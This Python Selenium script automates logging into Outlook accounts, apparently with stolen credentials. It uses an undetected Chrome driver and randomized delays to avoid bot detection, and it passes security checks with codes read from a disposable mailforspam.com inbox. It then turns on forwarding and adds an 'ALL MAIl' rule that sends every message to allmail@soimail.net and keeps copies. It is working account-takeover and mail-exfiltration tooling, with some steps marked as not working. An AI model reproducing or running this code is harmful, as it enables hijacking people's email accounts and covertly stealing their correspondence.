import time
import random
from bs4 import BeautifulSoup
from undetected_chromedriver import Chrome, ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys


def sleep_random():
    # Generate a random sleep time between 0.5 to 1 seconds
    sleep_time = random.uniform(0.7, 1)
    time.sleep(sleep_time)


def clickNext(driver):
    try:
        # Wait for the input field to be clickable
        _next = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@data-report-value="Submit"]'))
        )
        sleep_random()
        _next.click()
    except Exception as e:
        print(f"Error => {e}")


def inputEmail(driver, email):
    try:
        # Wait for the input field to be clickable
        input_field = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@id="i0116"]'))
        )
        sleep_random()
        input_field.click()
        input_field.send_keys(email)  # Replace this with your email
    except Exception as e:
        print(f"Error => {e}")


def inputPass(driver, password):
    try:
        # Wait for the input field to be clickable
        input_field = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@type="password"]'))
        )
        sleep_random()
        input_field.click()
        sleep_random()
        input_field.send_keys(password)  # Replace this with your email
    except Exception as e:
        print(f"Error => {e}")


def inputConfirmEmail(driver, confirm_email):
    try:
        # Find the email input field using its XPath
        email_input = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@id="iProofEmail"]'))
        )
        sleep_random()
        if email_input:
            email_input.send_keys(confirm_email)  # Enter email address
            print("Email entered successfully")
        else:
            print("Email input field not found")

    except Exception as e:
        print(f"Error => {e}")


def submitConfirmEmail(driver):
    # Find the submit button using its XPath
    submit_button = WebDriverWait(driver, 30).until(
        EC.element_to_be_clickable((By.XPATH, '//input[@id="iSelectProofAction"]'))
    )
    sleep_random()
    if submit_button:
        submit_button.click()
        sleep_random()
        print("Submit button clicked successfully")
    else:
        print("Submit button not found")


def submitSecurityCode(driver):
    # Find the submit button using its XPath
    submit_button = WebDriverWait(driver, 30).until(
        EC.element_to_be_clickable((By.XPATH, '//input[@id="iVerifyCodeAction"]'))
    )
    sleep_random()
    if submit_button:
        submit_button.click()
        sleep_random()
        print("Submit button clicked successfully")
    else:
        print("Submit button not found")


def switchWindow(driver, tab):
    # Switch to the new tab
    driver.switch_to.window(driver.window_handles[tab])


def newTab(driver, tab):
    # Execute JavaScript to open a new tab
    driver.execute_script("window.open('about:blank','_blank');")
    sleep_random()
    # Switch to the new tab
    driver.switch_to.window(driver.window_handles[tab])


def emailForCode(driver, email):
    # Find the submit button using its XPath
    _email = WebDriverWait(driver, 30).until(
        EC.element_to_be_clickable((By.XPATH, '//input[@name="spammail"]'))
    )
    sleep_random()
    _email.click()
    _email.send_keys(email)
    sleep_random()
    _email.send_keys(Keys.RETURN)
    sleep_random()


def clickForCode(driver):
    # Find the <a> element using XPath with normalize-space()
    link_element = WebDriverWait(driver, 30).until(
        EC.element_to_be_clickable((By.XPATH, '//a[normalize-space(text())="Microsoft account security code"]'))
    )

    sleep_random()
    link_element.click()
    sleep_random()


def getSecurityCode(driver):
    try:
        # Get the page source
        page_source = driver.page_source

        # Parse the HTML content
        soup = BeautifulSoup(page_source, 'html.parser')

        # Find the <p> tag with id="messagebody"
        message_body = soup.find('p', id='messagebody')

        # Find the text "Security code: " within the <p> tag
        security_code_text = message_body.find(text=lambda text: text and "Security code: " in text)

        # If the text is found, extract the security code
        if security_code_text:
            code_index = security_code_text.find("Security code: ") + len("Security code: ")
            code = security_code_text[code_index:].strip()
            print("Security code:", code)
            return code
        else:
            print("Security code not found")
    except Exception as e:
        print(f"Error => {e}")


def enterSecurityCode(driver, code):
    try:
        # Find the email input field using its XPath
        code_input = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@type="tel"]'))
        )
        sleep_random()
        if code_input:
            code_input.send_keys(code)  # Enter email address
            print("Email entered successfully")
        else:
            print("Email input field not found")

    except Exception as e:
        print(f"Error => {e}")


def goToSettings(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        settings_ = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//button[@id="owaSettingsButton"]'))
        )

        sleep_random()
        settings_.click()
        sleep_random()
    except Exception as e:
        print(f"error => {e}")

def settingFw(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        settings_fw = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//button[normalize-space(text())="Forwarding"]'))
        )

        sleep_random()
        settings_fw.click()
        sleep_random()
    except Exception as e:
        print(f"error => {e}")

def staySignedIn(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]'))
        )

        sleep_random()
        link_element.click()
        sleep_random()
    except Exception as e:
        print(f"error => {e}")

def emailCode(driver):
    try:
        link_element = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//div[starts-with(text(), 'Email')]"))
        )

        sleep_random()
        link_element.click()
        sleep_random()
    except Exception as e:
        print(f"error => {e}")

def reEnterConfirmEmail(driver, confirm_email):
    try:
        # Find the <a> element using XPath with normalize-space()
        settings_ = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@name="ProofConfirmation"]'))
        )

        sleep_random()
        settings_.click()
        sleep_random()
        settings_.send_keys(confirm_email)
        sleep_random()

    except Exception as e:
        print(f"error => {e}")

def clickSubmitButton(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        submit_ = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@type="submit"]'))
        )

        sleep_random()
        submit_.click()
        sleep_random()
        submit_.send_keys("kulejeqv26@mailforspam.com")
        sleep_random()

    except Exception as e:
        print(f"error => {e}")

def breakFromPassword(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        submit_ = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//a[@id="iCancel"]'))
        )

        sleep_random()
        submit_.click()
        sleep_random()

    except Exception as e:
        print(f"No popup")

def verifyIdentity(driver):
    emailCode(driver)
    sleep_random()
    reEnterConfirmEmail(driver, "dfnxwrnm70@mailforspam.com")
    sleep_random()
    clickSubmitButton(driver)
    sleep_random()
    getCode(driver)

def switchToggle(driver):
    try:
        time.sleep(10)
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//label[text()='Enable forwarding']"))
        )

        sleep_random()
        link_element.click()
        print("Forwarding Toggled")
        sleep_random()
        print("switchToggle done")
    except Exception as e:
        print(f"error => {e}")

def forwardTo(driver, email):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]'))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        link_element.send_keys(email)
        print("Email Entered For Forwarding")
        sleep_random()
        print("ForwardTo done")
    except Exception as e:
        print(f"error => {e}")

def selectCopy(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//span[text()='Keep a copy of forwarded messages']"))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        print("Select Copy done")
    except Exception as e:
        print(f"error => {e}")

def navigateToRules(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        settings_fw = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//button[normalize-space(text())="Rules"]'))
        )

        sleep_random()
        settings_fw.click()
        sleep_random()
        print("Navigate to rules done")
    except Exception as e:
        print(f"error => {e}")

def addNewRule(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//span[text()='Add new rule']"))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        print("AddNewRule done")
    except Exception as e:
        print(f"error => {e}")

def inputRuleName(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]'))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        link_element.send_keys("ALL MAIl")
        print("inputRuleName done")
    except Exception as e:
        print(f"error => {e}")

def addCondition(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        condition = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//span[normalize-space(text())="Select a condition"]'))
        )

        sleep_random()
        condition.click()
        sleep_random()
        print("addCOndition done")
    except Exception as e:
        print(f"error => {e}")

def applyToAll(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        apply_all = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//span[normalize-space(text())="Apply to all messages"]'))
        )

        sleep_random()
        apply_all.click()
        sleep_random()
        print("applytoall done")
    except Exception as e:
        print(f"error => {e}")

def addAction(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        condition = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//span[normalize-space(text())="Select an action"]'))
        )

        sleep_random()
        condition.click()
        sleep_random()
        print("addAction Done")
    except Exception as e:
        print(f"error => {e}")

def actionList(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        apply_all = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//span[normalize-space(text())="Forward to"]'))
        )

        sleep_random()
        apply_all.click()
        sleep_random()
        print("actionList Done")

    except Exception as e:
        print(f"error => {e}")

def enterForwardEmail(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//div[@role="textbox"]'))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        link_element.send_keys("allmail@soimail.net")
        sleep_random()
        # Locate the element using XPath
        confirm_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//div[@class="MIV76 j7as6"]'))
        )

        # Click the element
        confirm_element.click()
        sleep_random()
        print("EnterForwardEmail Done")
    except Exception as e:
        print(f"error => {e}")

def selectInputOption(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@id="iProof0"]'))
        )

        sleep_random()
        link_element.click()
        sleep_random()
        print("SelectInputOption Done")
    except Exception as e:
        print(f"error => {e}")

def verifyCode(driver):
    try:
        # Find the <a> element using XPath with normalize-space()
        link_element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@id="idSubmit_SAOTCC_Continue"]'))
        )

        sleep_random()
        link_element.click()
        print("Verify Code Done")
        sleep_random()
    except Exception as e:
        print(f"error => {e}")

def closePopUp(driver):
    try:
        # Wait for the element to be clickable
        element = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//button[@aria-label='Close']"))
        )

        # Click on the element
        element.click()
        print("Popup Closed")
    except Exception as e:
        print(f"Error Occurred => {e}")
def enableForwarding(driver, comfirmation_email):
    sleep_random()
    closePopUp(driver)
    sleep_random()
    goToSettings(driver)
    sleep_random()
    settingFw(driver)
    sleep_random()

    #Asking for verfication again
    emailCode(driver)
    sleep_random()
    reEnterConfirmEmail(driver, comfirmation_email)
    sleep_random()
    clickSubmitButton(driver)
    sleep_random()

    # Get Code Again
    getCode(driver, 3, comfirmation_email)
    sleep_random()
    verifyCode(driver)
    sleep_random()
    breakFromPassword(driver)
    sleep_random()

    # Continue with Forwarding
    sleep_random()
    closePopUp(driver)
    sleep_random()
    switchToggle(driver) #not working
    sleep_random()
    forwardTo(driver, "allmail@soimail.net")
    selectCopy(driver) #not working

    # Add New Rule
    navigateToRules(driver)
    sleep_random()
    addNewRule(driver)
    sleep_random()
    inputRuleName(driver)
    sleep_random()
    addCondition(driver)
    sleep_random()
    applyToAll(driver)
    sleep_random()
    addAction(driver)
    sleep_random()
    actionList(driver)
    enterForwardEmail(driver)

def getCode(driver, tab, comfirmation_email):
    newTab(driver, tab)
    driver.get("https://mailforspam.com")
    emailForCode(driver, comfirmation_email)
    sleep_random()
    clickForCode(driver)
    sleep_random()
    security_code = getSecurityCode(driver)
    sleep_random()

    # Switch to the new tab
    driver.switch_to.window(driver.window_handles[1])

    sleep_random()
    enterSecurityCode(driver, security_code)
    sleep_random()


def bot_main(email, password, comfirmation_email):
    try:
        # Set up Chrome options
        options = ChromeOptions()
        # options.add_argument("--headless")  # Optional: Run Chrome in headless mode
        options.add_argument("--disable-extensions")  # Disable extensions
        options.binary_location = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"  # Specify the correct path to Chrome binary

        # Initialize Chrome browser
        driver = Chrome(options=options)

        # Open the URL
        url = "https://outlook.live.com/mail/0/"  # Replace this with your desired URL
        driver.get(url)

        # Wait for the element to be clickable
        sign_in = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '//a[@data-bi-cn="SignIn"]'))
        )

        if sign_in:
            sign_in.click()
            print("Sign in button clicked")
            sleep_random()
            switchWindow(driver, 1)
            sleep_random()
            inputEmail(driver, email)
            sleep_random()
            clickNext(driver)
            sleep_random()
            inputPass(driver, password)
            sleep_random()
            clickNext(driver)
            sleep_random()
            selectInputOption(driver)
            sleep_random()
            inputConfirmEmail(driver, comfirmation_email)
            sleep_random()
            submitConfirmEmail(driver)

            # Verification Code
            getCode(driver, 2, comfirmation_email)
            submitSecurityCode(driver)
            sleep_random()
            staySignedIn(driver)
            sleep_random()
            breakFromPassword(driver)

            # Enable Forwarding
            enableForwarding(driver, comfirmation_email)
            print("Email entered successfully")

        else:
            print("no sign in button")

        time.sleep(5)
    except Exception as e:
        print("An error occurred:", e)

    finally:
        # Close the browser
        if 'driver' in locals():
            driver.quit()
